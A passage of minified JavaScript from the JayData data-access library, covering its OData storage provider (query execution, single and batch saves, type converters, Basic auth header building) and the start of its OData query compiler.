cfg.license==='string'&&cfg.license.toLowerCase()==='business'){if(cfg.appId&&cfg.serviceName){apiKey=protocol+'://'+cfg.appId+'.jaystack.net'+port+'/'+cfg.serviceName;}else{apiKey=cfg.url;}}else{if(cfg.ownerId&&cfg.appId&&cfg.serviceName){apiKey=protocol+'://open.jaystack.net/'+cfg.ownerId+'/'+cfg.appId+'/api/'+cfg.serviceName;}else{apiKey=cfg.url;}}
delete cfg.url;cfg=$data.typeSystem.extend(cfg,options);}else{cfg=options;}
$data.service(apiKey,cfg).then(function(factory){var ctx=factory();return ctx.onReady().then(function(context){context.serviceFactory=factory;d.deferred.resolve(context,factory,factory.type);}).fail(function(){d.deferred.reject.apply(d.deferred,arguments);});});return d.getPromise();};})($data);
// js/jaydata/jaydataproviders/oDataProvider.js

$C('$data.storageProviders.oData.oDataProvider',$data.StorageProviderBase,null,{constructor:function(cfg,ctx){if(typeof OData==='undefined'){Guard.raise(new Exception('datajs is required','Not Found!'));}
this.SqlCommands=[];this.context=ctx;this.providerConfiguration=$data.typeSystem.extend({dbCreation:$data.storageProviders.DbCreationType.DropTableIfChanged,oDataServiceHost:"/odata.svc",serviceUrl:"",maxDataServiceVersion:'2.0',user:null,password:null,withCredentials:false},cfg);if(this.context&&this.context._buildDbType_generateConvertToFunction&&this.buildDbType_generateConvertToFunction){this.context._buildDbType_generateConvertToFunction=this.buildDbType_generateConvertToFunction;}
if(this.context&&this.context._buildDbType_modifyInstanceDefinition&&this.buildDbType_modifyInstanceDefinition){this.context._buildDbType_modifyInstanceDefinition=this.buildDbType_modifyInstanceDefinition;}},initializeStore:function(callBack){callBack=$data.typeSystem.createCallbackSetting(callBack);switch(this.providerConfiguration.dbCreation){case $data.storageProviders.DbCreationType.DropAllExistingTables:var that=this;if(this.providerConfiguration.serviceUrl){var requestData=[{requestUri:that.providerConfiguration.serviceUrl+"/Delete",method:'POST'},function(d){callBack.success(that.context);},function(error){callBack.success(that.context);}];this.appendBasicAuth(requestData[0],this.providerConfiguration.user,this.providerConfiguration.password,this.providerConfiguration.withCredentials);this.context.prepareRequest.call(this,requestData);OData.request.apply(this,requestData);}else{callBack.success(that.context);}
break;default:callBack.success(this.context);break;}},buildDbType_generateConvertToFunction:function(storageModel,context){return function(logicalEntity,convertedItems){var dbInstance=new storageModel.PhysicalType();dbInstance.entityState=logicalEntity.entityState;storageModel.PhysicalType.memberDefinitions.getPublicMappedProperties().forEach(function(property){dbInstance[property.name]=logicalEntity[property.name];},this);if(storageModel.Associations){storageModel.Associations.forEach(function(association){if((association.FromMultiplicity=="*"&&association.ToMultiplicity=="0..1")||(association.FromMultiplicity=="0..1"&&association.ToMultiplicity=="1")||(association.FromMultiplicity=='$$unbound')){var refValue=logicalEntity[association.FromPropertyName];if(refValue!==undefined){if(refValue instanceof $data.Array){dbInstance[association.FromPropertyName]=dbInstance[association.FromPropertyName]||[];refValue.forEach(function(rv){var contentId=convertedItems.indexOf(rv);if(contentId<0){Guard.raise("Dependency graph error");}
dbInstance[association.FromPropertyName].push({__metadata:{uri:"$"+(contentId+1)}});},this);}else if(refValue===null){dbInstance[association.FromPropertyName]=null;}else{if(convertedItems.indexOf(refValue)<0){var sMod=context._storageModel.getStorageModel(refValue.getType())
var tblName=sMod.TableName;var pk='('+context.storageProvider.getEntityKeysValue({data:refValue,entitySet:context.getEntitySetFromElementType(refValue.getType())})+')';dbInstance[association.FromPropertyName]={__metadata:{uri:tblName+pk}};}else{var contentId=convertedItems.indexOf(refValue);if(contentId<0){Guard.raise("Dependency graph error");}
dbInstance[association.FromPropertyName]={__metadata:{uri:"$"+(contentId+1)}};}}}}},this);}
if(storageModel.ComplexTypes){storageModel.ComplexTypes.forEach(function(cmpType){dbInstance[cmpType.FromPropertyName]=logicalEntity[cmpType.FromPropertyName];},this);}
return dbInstance;};},buildDbType_modifyInstanceDefinition:function(){return;},executeQuery:function(query,callBack){callBack=$data.typeSystem.createCallbackSetting(callBack);var sql;try{sql=this._compile(query);}catch(e){callBack.error(e);return;}
var schema=this.context;var requestData=[{requestUri:this.providerConfiguration.oDataServiceHost+sql.queryText,method:sql.method,data:sql.postData,headers:{MaxDataServiceVersion:this.providerConfiguration.maxDataServiceVersion}},function(data,textStatus,jqXHR){if(!data&&textStatus.body)data=JSON.parse(textStatus.body);if(callBack.success){query.rawDataList=typeof data==='string'?[{cnt:data}]:data;if(sql.withInlineCount&&typeof data==='object'&&(data.__count||('d'in data&&data.d.__count))){query.__count=new Number(data.__count||data.d.__count).valueOf();}
callBack.success(query);}},function(jqXHR,textStatus,errorThrow){callBack.error(errorThrow||new Exception('Request failed','RequestError',arguments));}];if(typeof this.providerConfiguration.enableJSONP!=='undefined'){requestData[0].enableJsonpCallback=this.providerConfiguration.enableJSONP;}
this.appendBasicAuth(requestData[0],this.providerConfiguration.user,this.providerConfiguration.password,this.providerConfiguration.withCredentials);this.context.prepareRequest.call(this,requestData);OData.request.apply(this,requestData);},_compile:function(queryable,params){var compiler=new $data.storageProviders.oData.oDataCompiler();var compiled=compiler.compile(queryable);return compiled;},saveChanges:function(callBack,changedItems){if(changedItems.length>0){var independentBlocks=this.buildIndependentBlocks(changedItems);this.saveInternal(independentBlocks,0,callBack);}
else{callBack.success(0);}},saveInternal:function(independentBlocks,index2,callBack){if(independentBlocks.length>1||(independentBlocks.length==1&&independentBlocks[0].length>1))
this._saveBatch(independentBlocks,index2,callBack);else
this._saveRest(independentBlocks,index2,callBack);},_saveRest:function(independentBlocks,index2,callBack){var batchRequests=[];var convertedItem=[];var request;for(var index=0;index<independentBlocks.length;index++){for(var i=0;i<independentBlocks[index].length;i++){convertedItem.push(independentBlocks[index][i].data);request={requestUri:this.providerConfiguration.oDataServiceHost+'/',headers:{MaxDataServiceVersion:this.providerConfiguration.maxDataServiceVersion}};switch(independentBlocks[index][i].data.entityState){case $data.EntityState.Unchanged:continue;break;case $data.EntityState.Added:request.method="POST";request.requestUri+=independentBlocks[index][i].entitySet.tableName;request.data=this.save_getInitData(independentBlocks[index][i],convertedItem);break;case $data.EntityState.Modified:request.method="MERGE";request.requestUri+=independentBlocks[index][i].entitySet.tableName;request.requestUri+="("+this.getEntityKeysValue(independentBlocks[index][i])+")";this.save_addConcurrencyHeader(independentBlocks[index][i],request.headers);request.data=this.save_getInitData(independentBlocks[index][i],convertedItem);break;case $data.EntityState.Deleted:request.method="DELETE";request.requestUri+=independentBlocks[index][i].entitySet.tableName;request.requestUri+="("+this.getEntityKeysValue(independentBlocks[index][i])+")";this.save_addConcurrencyHeader(independentBlocks[index][i],request.headers);break;default:Guard.raise(new Exception("Not supported Entity state"));}}}
var that=this;var requestData=[request,function(data,response){if(response.statusCode>200&&response.statusCode<300){var item=convertedItem[0];if(response.statusCode==204){if(response.headers.ETag||response.headers.Etag||response.headers.etag){var property=item.getType().memberDefinitions.getPublicMappedProperties().filter(function(memDef){return memDef.concurrencyMode===$data.ConcurrencyMode.Fixed});if(property&&property[0]){item[property[0].name]=response.headers.ETag||response.headers.Etag||response.headers.etag;}}}else{item.getType().memberDefinitions.getPublicMappedProperties().forEach(function(memDef){var propType=Container.resolveType(memDef.type);if(memDef.computed||memDef.key||(!propType.isAssignableto&&!memDef.inverseProperty)){if(memDef.concurrencyMode===$data.ConcurrencyMode.Fixed){item[memDef.name]=response.headers.ETag||response.headers.Etag||response.headers.etag;}else{var converter=that.fieldConverter.fromDb[Container.resolveName(memDef.type)];item[memDef.name]=converter?converter(data[memDef.name]):data[memDef.name];}}},this);}
if(callBack.success){callBack.success(convertedItem.length);}}else{callBack.error(response);}},function(e){callBack.error(new Exception((e.response||{}).body,e.message,e));}];this.appendBasicAuth(requestData[0],this.providerConfiguration.user,this.providerConfiguration.password,this.providerConfiguration.withCredentials);this.context.prepareRequest.call(this,requestData);OData.request.apply(this,requestData);},_saveBatch:function(independentBlocks,index2,callBack){var batchRequests=[];var convertedItem=[];for(var index=0;index<independentBlocks.length;index++){for(var i=0;i<independentBlocks[index].length;i++){convertedItem.push(independentBlocks[index][i].data);var request={};request.headers={"Content-Id":convertedItem.length};switch(independentBlocks[index][i].data.entityState){case $data.EntityState.Unchanged:continue;break;case $data.EntityState.Added:request.method="POST";request.requestUri=independentBlocks[index][i].entitySet.tableName;request.data=this.save_getInitData(independentBlocks[index][i],convertedItem);break;case $data.EntityState.Modified:request.method="MERGE";request.requestUri=independentBlocks[index][i].entitySet.tableName;request.requestUri+="("+this.getEntityKeysValue(independentBlocks[index][i])+")";this.save_addConcurrencyHeader(independentBlocks[index][i],request.headers);request.data=this.save_getInitData(independentBlocks[index][i],convertedItem);break;case $data.EntityState.Deleted:request.method="DELETE";request.requestUri=independentBlocks[index][i].entitySet.tableName;request.requestUri+="("+this.getEntityKeysValue(independentBlocks[index][i])+")";this.save_addConcurrencyHeader(independentBlocks[index][i],request.headers);break;default:Guard.raise(new Exception("Not supported Entity state"));}
batchRequests.push(request);}}
var that=this;var requestData=[{requestUri:this.providerConfiguration.oDataServiceHost+"/$batch",method:"POST",data:{__batchRequests:[{__changeRequests:batchRequests}]},headers:{MaxDataServiceVersion:this.providerConfiguration.maxDataServiceVersion}},function(data,response){if(response.statusCode==202){var result=data.__batchResponses[0].__changeResponses;var errors=[];for(var i=0;i<result.length;i++){if(result[i].statusCode>200&&result[i].statusCode<300){var item=convertedItem[i];if(result[i].statusCode==204){if(result[i].headers.ETag||result[i].headers.Etag||result[i].headers.etag){var property=item.getType().memberDefinitions.getPublicMappedProperties().filter(function(memDef){return memDef.concurrencyMode===$data.ConcurrencyMode.Fixed});if(property&&property[0]){item[property[0].name]=result[i].headers.ETag||result[i].headers.Etag||result[i].headers.etag;}}
continue;}
item.getType().memberDefinitions.getPublicMappedProperties().forEach(function(memDef){var propType=Container.resolveType(memDef.type);if(memDef.computed||memDef.key||(!propType.isAssignableto&&!memDef.inverseProperty)){if(memDef.concurrencyMode===$data.ConcurrencyMode.Fixed){item[memDef.name]=result[i].headers.ETag||result[i].headers.Etag||result[i].headers.etag;}else{var converter=that.fieldConverter.fromDb[Container.resolveName(memDef.type)];item[memDef.name]=converter?converter(result[i].data[memDef.name]):result[i].data[memDef.name];}}},this);}else{errors.push(new Exception((result[i].response||{}).body,result[i].message,result[i]));}}
if(errors.length>0){callBack.error(new Exception('See inner exceptions','Batch failed',errors));}else if(callBack.success){callBack.success(convertedItem.length);}}else{callBack.error(response);}},function(e){callBack.error(new Exception((e.response||{}).body,e.message,e));},OData.batchHandler];this.appendBasicAuth(requestData[0],this.providerConfiguration.user,this.providerConfiguration.password,this.providerConfiguration.withCredentials);this.context.prepareRequest.call(this,requestData);OData.request.apply(this,requestData);},save_getInitData:function(item,convertedItems){item.physicalData=this.context._storageModel.getStorageModel(item.data.getType()).PhysicalType.convertTo(item.data,convertedItems);var serializableObject={}
item.physicalData.getType().memberDefinitions.asArray().forEach(function(memdef){if(memdef.kind==$data.MemberTypes.navProperty||memdef.kind==$data.MemberTypes.complexProperty||(memdef.kind==$data.MemberTypes.property&&!memdef.notMapped)){if(typeof memdef.concurrencyMode==='undefined'&&(memdef.key===true||item.data.entityState===$data.EntityState.Added||item.data.changedProperties.some(function(def){return def.name===memdef.name;})))
serializableObject[memdef.name]=item.physicalData[memdef.name];}},this);return serializableObject;},save_addConcurrencyHeader:function(item,headers){var property=item.data.getType().memberDefinitions.getPublicMappedProperties().filter(function(memDef){return memDef.concurrencyMode===$data.ConcurrencyMode.Fixed});if(property&&property[0]){headers['If-Match']=item.data[property[0].name];}},getTraceString:function(queryable){var sqlText=this._compile(queryable);return queryable;},supportedDataTypes:{value:[$data.Integer,$data.String,$data.Number,$data.Blob,$data.Boolean,$data.Date,$data.Object,$data.GeographyPoint,$data.Guid,$data.GeographyLineString,$data.GeographyPolygon,$data.GeographyMultiPoint,$data.GeographyMultiLineString,$data.GeographyMultiPolygon,$data.GeographyCollection,$data.GeometryPoint,$data.GeometryLineString,$data.GeometryPolygon,$data.GeometryMultiPoint,$data.GeometryMultiLineString,$data.GeometryMultiPolygon,$data.GeometryCollection],writable:false},supportedBinaryOperators:{value:{equal:{mapTo:'eq',dataType:"boolean",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},notEqual:{mapTo:'ne',dataType:"boolean",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},equalTyped:{mapTo:'eq',dataType:"boolean",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},notEqualTyped:{mapTo:'ne',dataType:"boolean",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},greaterThan:{mapTo:'gt',dataType:"boolean",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},greaterThanOrEqual:{mapTo:'ge',dataType:"boolean",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},lessThan:{mapTo:'lt',dataType:"boolean",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},lessThenOrEqual:{mapTo:'le',dataType:"boolean",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},or:{mapTo:'or',dataType:"boolean",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},and:{mapTo:'and',dataType:"boolean",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},add:{mapTo:'add',dataType:"number",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},divide:{mapTo:'div',allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},multiply:{mapTo:'mul',allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},subtract:{mapTo:'sub',allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},modulo:{mapTo:'mod',allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]},"in":{mapTo:"in",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression]}}},supportedUnaryOperators:{value:{not:{mapTo:'not'}}},supportedFieldOperations:{value:{contains:{mapTo:"substringof",dataType:"boolean",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"substring",dataType:"string"},{name:"@expression"}]},startsWith:{mapTo:"startswith",dataType:"string",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"string"},{name:"strFragment",dataType:"string"}]},endsWith:{mapTo:"endswith",dataType:"string",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"string"},{name:"strFragment",dataType:"string"}]},length:[{allowedType:'string',dataType:"number",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.ProjectionExpression],parameters:[{name:"@expression",dataType:"string"}]},{allowedType:'GeographyLineString',mapTo:"geo.length",dataType:"number",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:['GeographyLineString']}],fixedDataType:'decimal'},{allowedType:'GeometryLineString',mapTo:"geo.length",dataType:"number",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:'GeometryLineString'}],fixedDataType:'decimal'}],strLength:{mapTo:"length",dataType:"number",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.ProjectionExpression],parameters:[{name:"@expression",dataType:"string"}]},indexOf:{dataType:"number",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],mapTo:"indexof",baseIndex:1,parameters:[{name:'@expression',dataType:"string"},{name:'strFragment',dataType:'string'}]},replace:{dataType:"string",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:'@expression',dataType:"string"},{name:'strFrom',dataType:'string'},{name:'strTo',dataType:'string'}]},substr:{mapTo:"substring",dataType:"string",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"string"},{name:"startFrom",dataType:"number"},{name:"length",dataType:"number",optional:"true"}]},toLowerCase:{mapTo:"tolower",dataType:"string",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"string"}]},toUpperCase:{mapTo:"toupper",dataType:"string",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"string"}]},trim:{dataType:"string",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"string"}]},concat:{dataType:"string",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"string"},{name:"strFragment",dataType:"string"}]},day:{allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"date"}]},hour:{allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"date"}]},minute:{allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"date"}]},month:{allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"date"}]},second:{allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"date"}]},year:{allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"date"}]},round:{allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"date"}]},floor:{allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"date"}]},ceiling:{allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:"date"}]},distance:[{allowedType:'GeographyPoint',mapTo:"geo.distance",dataType:"number",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:'GeographyPoint'},{name:"to",dataType:'GeographyPoint'}],fixedDataType:'decimal'},{allowedType:'GeometryPoint',mapTo:"geo.distance",dataType:"number",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:'GeometryPoint'},{name:"to",dataType:'GeometryPoint'}],fixedDataType:'decimal'}],intersects:[{allowedType:'GeographyPoint',mapTo:"geo.intersects",dataType:"boolean",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:'GeographyPoint'},{name:"in",dataType:'GeographyPolygon'}]},{allowedType:'GeometryPoint',mapTo:"geo.intersects",dataType:"boolean",allowedIn:[$data.Expressions.FilterExpression,$data.Expressions.OrderExpression],parameters:[{name:"@expression",dataType:'GeometryPoint'},{name:"in",dataType:'GeometryPolygon'}]}]},enumerable:true,writable:true},supportedSetOperations:{value:{filter:{},map:{},length:{},forEach:{},toArray:{},single:{},some:{invokable:false,allowedIn:[$data.Expressions.FilterExpression],parameters:[{name:"filter",dataType:"$data.Queryable"}],mapTo:'any',frameType:$data.Expressions.SomeExpression},every:{invokable:false,allowedIn:[$data.Expressions.FilterExpression],parameters:[{name:"filter",dataType:"$data.Queryable"}],mapTo:'all',frameType:$data.Expressions.EveryExpression},take:{},skip:{},orderBy:{},orderByDescending:{},first:{},include:{},batchDelete:{},withInlineCount:{}},enumerable:true,writable:true},fieldConverter:{value:{fromDb:{'$data.Integer':function(number){return(typeof number==='string'&&/^\d+$/.test(number))?parseInt(number):number;},'$data.Number':function(number){return number;},'$data.Date':function(dbData){if(dbData){if(dbData.substring(0,6)==='/Date('){return new Date(parseInt(dbData.substr(6)));}else{if(dbData.indexOf('Z')===-1&&!dbData.match('T.*[+-]'))
dbData+='Z';return new Date(dbData);}}else{return dbData;}},'$data.String':function(text){return text;},'$data.Boolean':function(bool){return bool;},'$data.Blob':function(blob){return blob;},'$data.Object':function(o){if(o===undefined){return new $data.Object();}else if(typeof o==='string'){return JSON.parse(o);}return o;},'$data.Array':function(o){if(o===undefined){return new $data.Array();}else if(o instanceof $data.Array){return o;}return JSON.parse(o);},'$data.GeographyPoint':function(g){if(g){return new $data.GeographyPoint(g);}return g;},'$data.GeographyLineString':function(g){if(g){return new $data.GeographyLineString(g);}return g;},'$data.GeographyPolygon':function(g){if(g){return new $data.GeographyPolygon(g);}return g;},'$data.GeographyMultiPoint':function(g){if(g){return new $data.GeographyMultiPoint(g);}return g;},'$data.GeographyMultiLineString':function(g){if(g){return new $data.GeographyMultiLineString(g);}return g;},'$data.GeographyMultiPolygon':function(g){if(g){return new $data.GeographyMultiPolygon(g);}return g;},'$data.GeographyCollection':function(g){if(g){return new $data.GeographyCollection(g);}return g;},'$data.GeometryPoint':function(g){if(g){return new $data.GeometryPoint(g);}return g;},'$data.GeometryLineString':function(g){if(g){return new $data.GeometryLineString(g);}return g;},'$data.GeometryPolygon':function(g){if(g){return new $data.GeometryPolygon(g);}return g;},'$data.GeometryMultiPoint':function(g){if(g){return new $data.GeometryMultiPoint(g);}return g;},'$data.GeometryMultiLineString':function(g){if(g){return new $data.GeometryMultiLineString(g);}return g;},'$data.GeometryMultiPolygon':function(g){if(g){return new $data.GeometryMultiPolygon(g);}return g;},'$data.GeometryCollection':function(g){if(g){return new $data.GeometryCollection(g);}return g;},'$data.Guid':function(guid){return guid?new $data.Guid(guid):guid;}},toDb:{'$data.Entity':function(e){return"'"+JSON.stringify(e.initData)+"'"},'$data.Integer':function(number){return number;},'$data.Number':function(number){return number%1==0?number:number+'m';},'$data.Date':function(date){return date?"datetime'"+date.toISOString()+"'":null;},'$data.String':function(text){return"'"+text.replace(/'/g,"''")+"'";},'$data.Boolean':function(bool){return bool?'true':'false';},'$data.Blob':function(blob){return blob;},'$data.Object':function(o){return JSON.stringify(o);},'$data.Array':function(o){return JSON.stringify(o);},'$data.GeographyPoint':function(g){if(g){return $data.Geography.stringifyToUrl(g);}return g;},'$data.GeographyLineString':function(g){if(g){return $data.Geography.stringifyToUrl(g);}return g;},'$data.GeographyPolygon':function(g){if(g){return $data.Geography.stringifyToUrl(g);}return g;},'$data.GeographyMultiPoint':function(g){if(g){return $data.Geography.stringifyToUrl(g);}return g;},'$data.GeographyMultiLineString':function(g){if(g){return $data.Geography.stringifyToUrl(g);}return g;},'$data.GeographyMultiPolygon':function(g){if(g){return $data.Geography.stringifyToUrl(g);}return g;},'$data.GeographyCollection':function(g){if(g){return $data.Geography.stringifyToUrl(g);}return g;},'$data.GeometryPoint':function(g){if(g){return $data.Geometry.stringifyToUrl(g);}return g;},'$data.GeometryLineString':function(g){if(g){return $data.Geometry.stringifyToUrl(g);}return g;},'$data.GeometryPolygon':function(g){if(g){return $data.Geometry.stringifyToUrl(g);}return g;},'$data.GeometryMultiPoint':function(g){if(g){return $data.Geometry.stringifyToUrl(g);}return g;},'$data.GeometryMultiLineString':function(g){if(g){return $data.Geometry.stringifyToUrl(g);}return g;},'$data.GeometryMultiPolygon':function(g){if(g){return $data.Geometry.stringifyToUrl(g);}return g;},'$data.GeometryCollection':function(g){if(g){return $data.Geometry.stringifyToUrl(g);}return g;},'$data.Guid':function(guid){return guid?("guid'"+guid.value+"'"):guid;}}}},resolveTypeOperations:function(operation,expression,frameType){var memDef=expression.entityType.getMemberDefinition(operation);if(!memDef||!memDef.method||memDef.method.IsSideEffecting!==false||!memDef.method.returnType||!(frameType===$data.Expressions.FilterExpression||frameType===$data.Expressions.OrderExpression))
{Guard.raise(new Exception("Entity '"+expression.entityType.name+"' Operation '"+operation+"' is not supported by the provider"));}
return memDef;},resolveSetOperations:function(operation,expression,frameType){if(expression){var esDef=expression.storageModel.ContextType.getMemberDefinition(expression.storageModel.ItemName);if(esDef&&esDef.actions&&esDef.actions[operation]){var memDef=$data.MemberDefinition.translateDefinition(esDef.actions[operation],operation,this.getType());if(!memDef||!memDef.method||memDef.method.IsSideEffecting!==false||!memDef.method.returnType||!(frameType===$data.Expressions.FilterExpression||frameType===$data.Expressions.OrderExpression)){Guard.raise(new Exception("Collection '"+expression.storageModel.ItemName+"' Operation '"+operation+"' is not supported by the provider"));}
return memDef;}}
return $data.StorageProviderBase.prototype.resolveSetOperations.apply(this,arguments);},resolveContextOperations:function(operation,expression,frameType){var memDef=this.context.getType().getMemberDefinition(operation);if(!memDef||!memDef.method||memDef.method.IsSideEffecting!==false||!memDef.method.returnType||!(frameType===$data.Expressions.FilterExpression||frameType===$data.Expressions.OrderExpression)){Guard.raise(new Exception("Context '"+expression.instance.getType().name+"' Operation '"+operation+"' is not supported by the provider"));}
return memDef;},getEntityKeysValue:function(entity){var result=[];var keyValue=undefined;var memDefs=entity.data.getType().memberDefinitions.getKeyProperties();for(var i=0,l=memDefs.length;i<l;i++){var field=memDefs[i];if(field.key){keyValue=entity.data[field.name];switch(Container.getName(field.dataType)){case"$data.Guid":case"Edm.Guid":keyValue=("guid'"+(keyValue?keyValue.value:keyValue)+"'");break;case"$data.Blob":case"Edm.Binary":keyValue=("binary'"+keyValue+"'");break;case"Edm.Byte":var hexDigits='0123456789ABCDEF';keyValue=(hexDigits[(i>>4)&15]+hexDigits[i&15]);break;case"$data.Date":case"Edm.DateTime":keyValue=("datetime'"+keyValue.toISOString()+"'");break;case"Edm.Decimal":keyValue=(keyValue+"M");break;case"Edm.Single":keyValue=(keyValue+"f");break;case"Edm.Int64":keyValue=(keyValue+"L");break;case'Edm.String':case"$data.String":keyValue=("'"+keyValue+"'");break;}
result.push(field.name+"="+keyValue);}}
if(result.length>1){return result.join(",");}
return keyValue;},appendBasicAuth:function(request,user,password,withCredentials){request.headers=request.headers||{};if(!request.headers.Authorization&&user&&password){request.headers.Authorization="Basic "+this.__encodeBase64(user+":"+password);request.withCredentials=withCredentials;}},__encodeBase64:function(val){var b64array="ABCDEFGHIJKLMNOP"+"QRSTUVWXYZabcdef"+"ghijklmnopqrstuv"+"wxyz0123456789+/"+"=";var input=val;var base64="";var hex="";var chr1,chr2,chr3="";var enc1,enc2,enc3,enc4="";var i=0;do{chr1=input.charCodeAt(i++);chr2=input.charCodeAt(i++);chr3=input.charCodeAt(i++);enc1=chr1>>2;enc2=((chr1&3)<<4)|(chr2>>4);enc3=((chr2&15)<<2)|(chr3>>6);enc4=chr3&63;if(isNaN(chr2)){enc3=enc4=64;}else if(isNaN(chr3)){enc4=64;}
base64=base64+
b64array.charAt(enc1)+
b64array.charAt(enc2)+
b64array.charAt(enc3)+
b64array.charAt(enc4);chr1=chr2=chr3="";enc1=enc2=enc3=enc4="";}while(i<input.length);return base64;}},null);$data.StorageProviderBase.registerProvider("oData",$data.storageProviders.oData.oDataProvider);$C('$data.storageProviders.oData.oDataCompiler',$data.Expressions.EntityExpressionVisitor,null,{constructor:function(){this.context={};this.provider={};this.includes=null;this.mainEntitySet=null;},compile:function(query){this.provider=query.context.storageProvider;this.context=query.context;this.mainEntitySet=query.context.getEntitySetFromElementType(query.defaultType);var queryFragments={urlText:""};this.Visit(query.expression,queryFragments);query.modelBinderConfig={};var modelBinder=Container.createModelBinderConfigCompiler(query,this.includes,true);modelBinder.Visit(query.expression);var queryText=queryFragments.urlText;var addAmp=false;for(var name in queryFragments){if(name!="urlText"&&name!="actionPack"&&name!="data"&&name!="lambda"&&name!="method"&&name!="postData"&&queryFragments[name]!=""){if(addAmp){queryText+="&";}else{queryText+="?";}
addAmp=true;if(name!="$urlParams"){queryText+=name+'='+queryFragments[name];}else{queryText+=queryFragments[name];}}}
query.queryText=queryText;return{queryText:queryText,withInlineCount:'$inlinecount'in queryFragments,method:queryFragments.method||'GET',postData:queryFragments.postData,params:[]};},VisitOrderExpression:function(expression,context){this.Visit(expression.source,context);var orderCompiler=Container.createoDataOrderCompiler(this.provider);orderCompiler.compile(expression,context);},VisitPagingExpression:function(expression,context){this.Visit(expression.source,context);var pagingCompiler=Container.createoDataPagingCompiler();pagingCompiler.compile(expression,context);},VisitIncludeExpression:function(expression,context){this.Visit(expression.source,context);if(!context['$select']){if(context['$expand']){context['$expand']+=',';}else{context['$expand']='';}
context['$expand']+=expression.selector.value.replace(/\./g,'/');this.includes=this.includes||[];var includeFragment=expression.selector.value.split('.');var tempData=null;var storageModel=this.mainEntitySet.entityContext._storageModel.getStorageModel(this.mainEntitySet.createNew);for(var i=0;i<includeFragment.length;i++){if(tempData){tempData+='.'+includeFragment[i];}else{tempData=includeFragment[i];}
var association=storageModel.Associations[includeFragment[i]];if(association){if(!this.includes.some(function(include){return include.name==tempData},this)){this.includes.push({name:tempData,type:association.ToType});}}
else{Guard.raise(new Exception("The given include path is invalid: "+expression.selector.value+", invalid point: "+tempData));}
storageModel=this.mainEntitySet.entityContext._storageModel.getStorageModel(association.ToType);}}},VisitProjectionExpression:function(expression,context){this.Visit(expression.source,context);var projectionCompiler=Container.createoDataProjectionCompiler(this.context);projectionCompiler.compile(expression,context);},VisitFilterExpression:function(expression,context){this.Visit(expression.source,context);var filterCompiler=Container.createoDataWhereCompiler(this.provider);context.data="";filterCompiler.compile(expression.selector,context);context["$filter"]=context.data;context.data="";},VisitInlineCountExpression:function(expression,context){this.Visit(expression.source,context);context["$inlinecount"]=expression.selector.value;},VisitEntitySetExpression:function(expression,context){context.urlText+="/"+expression.instance.tableName;if(expression.params){for(var i=0;i<expression.params.length;i++){this.Visit(expression.params[i],context);}}},VisitServiceOperationExpression:function(expression,context){if(expression.bindedEntity){context.urlText+="/"+expression.bindedEntity.entitySet.tableName;if(expression.bindedEntity.data instanceof $data.Entity){context.urlText+='('+this.provider.getEntityKeysValue(expression.bindedEntity)+')';}}
